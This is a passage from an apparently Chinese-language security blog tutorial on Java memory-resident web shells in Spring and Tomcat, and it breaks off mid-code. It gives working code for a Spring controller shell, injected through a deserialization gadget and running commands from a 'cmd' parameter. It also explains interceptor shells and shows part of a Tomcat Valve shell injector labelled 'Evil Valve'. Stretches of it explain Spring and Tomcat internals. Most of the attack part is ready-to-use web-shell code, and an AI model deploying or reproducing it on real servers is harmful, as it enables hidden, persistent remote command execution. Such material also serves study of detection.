org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiEvilController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.example.spring.InjectControl&quot;</span>;</span><br><span class="line">            <span class="comment">//加载com.example.spring.InjectControl类的字节码</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             *  加载我们的恶意 Controller 字节码</span></span><br><span class="line"><span class="comment">            * */</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(InjectControl.class.getName()).toBytecode();</span><br><span class="line">            java.lang.<span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">m0</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            m0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            m0.invoke(classLoader, className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 获取上下文</span></span><br><span class="line"><span class="comment">            * */</span></span><br><span class="line">            <span class="comment">// first</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// second</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// third</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// fourth 从当前request属性中获取org.springframework.web.servlet.DispatcherServlet.CONTEXT, 其中对应的值为 AnnotationConfigServletWebServerApplicationContext</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line">            <span class="comment">//WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// fifth</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * registerMapping 在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式 ( 我2.6.6 也能注入进行就是好像会造成页面崩溃，但是不影响命令执行 )</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            <span class="comment">//从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="comment">//通过反射获得自定义controller中唯一的Method对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Class.forName(className).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line">            <span class="comment">//定义访问controller的URL地址</span></span><br><span class="line">            <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/hahahaLaLaLa&quot;</span>);</span><br><span class="line">            <span class="comment">//定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">            <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">            <span class="comment">//在内存中动态注册 controller</span></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            r.registerMapping(info, Class.forName(className).newInstance(), method);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>InjectControl</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Controller.koishi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectControl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectControl</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这个类也可以学胡师傅那样，写个 until 专门来存字节码</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/koishi&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="string">&quot;\\\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next() : o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>使用 gadget 加载 KoishiEvilController 打到 &#x2F;poc 端口即可</p>
<h2 id="七、Spring-Interceptor-内存马"><a href="#七、Spring-Interceptor-内存马" class="headerlink" title="七、Spring Interceptor 内存马"></a>七、Spring Interceptor 内存马</h2><p>同样推荐参考，拦截器处理原理不再做过多 “誊抄” ，这里只写下代码基本构成</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller" >Spring 内存马实现 | MYZXCG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>定义拦截器必须实现<code>HandlerInterceptor</code>接口，<code>HandlerInterceptor</code>接口中有三个方法：</p>
<ol>
<li>preHandle方法是controller方法执行前拦截的方法<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li>
<li>return false不放行，不会执行controller中的方法。</li>
</ul>
</li>
<li>postHandle是controller方法执行后执行的方法，在JSP视图执行前。<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li>
</ul>
</li>
<li>afterCompletion方法是在JSP执行后执行<ul>
<li>request或者response不能再跳转页面了</li>
</ul>
</li>
</ol>
</blockquote>
<h3 id="动态注入Interceptor"><a href="#动态注入Interceptor" class="headerlink" title="动态注入Interceptor"></a>动态注入Interceptor</h3><p>通过上面分析发现，如果把自定义的Interceptor类加入到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping </code>类的 <code>adaptedInterceptors</code> 属性中即可注册一个拦截器。这个挺好用，在每个页面都会触发，nice中的nice。</p>
<p>内存马代码见我给的项目吧，这里放个效果图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20221111205039773.png"
                      alt="image-20221111205039773"
                ></p>
<p>看这 <code>uri</code> 再怎么离谱、就算不存在都能触发，在每个页面都能触发，可以说是肥肠（非常）好用了，挺有意思</p>
<h2 id="八、Tomcat-Valve-内存马"><a href="#八、Tomcat-Valve-内存马" class="headerlink" title="八、Tomcat Valve 内存马"></a>八、Tomcat Valve 内存马</h2><h3 id="概念提要"><a href="#概念提要" class="headerlink" title="概念提要"></a>概念提要</h3><p>Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p>
<p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623645442719.jpg"
                      alt="img"
                ></p>
<p>上图的 basic 就是在前文中提到的最基础的 Valve，这个 basic 所属的类是 <code>StandardEngineValve</code></p>
<p>Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase。这个类帮我们实现了生命接口及MBean 接口，使我们只需专注阀门的逻辑处理即可。</p>
<p>在同一个Pipeline上可以有多个Valve,每个Valve都可以做一些操作，无论是Pipeline还是Valve操作的都是Request和Response。而在容器之间Pipeline和Valve则起到了桥梁的作用。</p>
<p>实在不好理解，可以将其类比于Filter 和 FilterChain 的关系</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/coldridgeValley/p/5816414.html" >Tomcat中容器的pipeline机制 - coldridgeValley - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getNext</span><span class="params">()</span>; <span class="comment">//获取下一个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve var1)</span>; <span class="comment">//设置下一个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>; <span class="comment">//后台执行逻辑</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request var1, Response var2)</span> <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>; <span class="comment">//是否异步执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先看<code>Valve</code>接口的方法定义，方法不是很多，这里只介绍<code>setNext()</code>,<code>getNext()</code>。在上面我们也看到了一个<code>Pipeline</code>上面可以有很多<code>Valve</code>，这些<code>Valve</code>存放的方式并非统一存放在<code>Pipeline</code>中，而是像一个链表一个接着一个。当你获取到一个<code>Valve</code>实例的时候，调用<code>getNext()</code>方法即可获取在这个<code>Pipeline</code>上的下个<code>Valve</code>实例。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getBasic</span><span class="params">()</span>; <span class="comment">//获取基础阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve var1)</span>; <span class="comment">//设置基础阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve var1)</span>; <span class="comment">//添加阀门</span></span><br><span class="line"></span><br><span class="line">    Valve[] getValves(); <span class="comment">//获取阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve var1)</span>; <span class="comment">//移除阀门</span></span><br><span class="line"></span><br><span class="line">    Valve <span class="title function_">getFirst</span><span class="params">()</span>; <span class="comment">//获取首个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>; <span class="comment">//是否支持异步</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看出<code>Pipeline</code>中很多的方法都是操作<code>Valve</code>的，包括获取，设置，移除<code>Valve</code>,<code>getFirst()</code>返回的是<code>Pipeline</code>上的第一个<code>Valve</code>,而<code>getBasic()</code>,<code>setBasic()</code>则是获取&#x2F;设置基础阀,我们都知道在<code>Pipeline</code>中，每个<code>pipeline</code>至少都有一个阀门，叫做基础阀，而<code>getBasic()</code>,<code>setBasic()</code>则是操作基础阀的。</p>
<p><strong>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Validate that we can add this Valve</span></span><br><span class="line">	<span class="comment">// 验证Valve 关联Container</span></span><br><span class="line">    <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Contained)</span><br><span class="line">        ((Contained) valve).setContainer(<span class="built_in">this</span>.container);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the new component if necessary</span></span><br><span class="line">	<span class="comment">// 验证组件状态，如果对的话 启动需要添加的Valve，调用start方法。</span></span><br><span class="line">    <span class="keyword">if</span> (getState().isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) valve).start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;StandardPipeline.addValve: start: &quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//如果 first变量为空，将valve赋值给first变量，并且设置 valve的下一个阀门为基础阀</span></span><br><span class="line">	<span class="comment">//之所以这样是因为，如果first为空说明这个容器只有一个基础阀，所以此次添加的阀门肯定是第一个非基础阀阀门</span></span><br><span class="line">    <span class="comment">// Add this Valve to the set associated with this Pipeline</span></span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">null</span>) &#123;</span><br><span class="line">        first = valve;</span><br><span class="line">        valve.setNext(basic);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//否则 遍历阀门链表，将要被添加的阀门设置在基础阀之前。</span></span><br><span class="line">        <span class="type">Valve</span> <span class="variable">current</span> <span class="operator">=</span> first;</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current.getNext() == basic) &#123;</span><br><span class="line">                current.setNext(valve);</span><br><span class="line">                valve.setNext(basic);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.getNext();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//container触发添加阀门事件</span></span><br><span class="line">    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p>
<p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623648233517.png"
                      alt="img"
                ></p>
<p>只要自己写一个 Valve 的实现类，为了方便也可以直接使用 ValveBase 实现类。里面的 <code>invoke</code> 方法加入我们的恶意代码，由于可以拿到 Request 和 Response 方法，所以也可以做一些参数上的处理或者回显。然后使用 StandardContext 中的 pipeline 属性的 addValve 方法进行注册。</p>
<h3 id="valve内存马编写路程"><a href="#valve内存马编写路程" class="headerlink" title="valve内存马编写路程"></a>valve内存马编写路程</h3><p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.github.io/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#toc-heading-3" >Java内存马系列-06-Tomcat 之 Valve 型内存马 | 芜风 (drun1baby.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们无法直接获取到 <code>StandardPipeline</code> ，需要先获取 <code>StandardContext</code>才能拿到</p>
<p>所以这里我们可以得到的攻击思路如下：</p>
<ul>
<li><p>先获取 <code>StandardContext</code></p>
</li>
<li><p>编写恶意 Valve</p>
</li>
<li><p>通过 <code>StandardContext.getPipeline().addValve()</code> 添加恶意 Valve</p>
</li>
<li><p>Valve 是应该放到 Servlet 里面，因为在 Servlet 内存马中的 <code>HTTP11Processor</code> 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic 的。所以我们通过 Servlet 来加载。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Valve;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/testk&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiValve</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveShell</span>());</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Evil Valve inject success!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span><span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(cmdParamName);</span><br><span class="line">                <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span 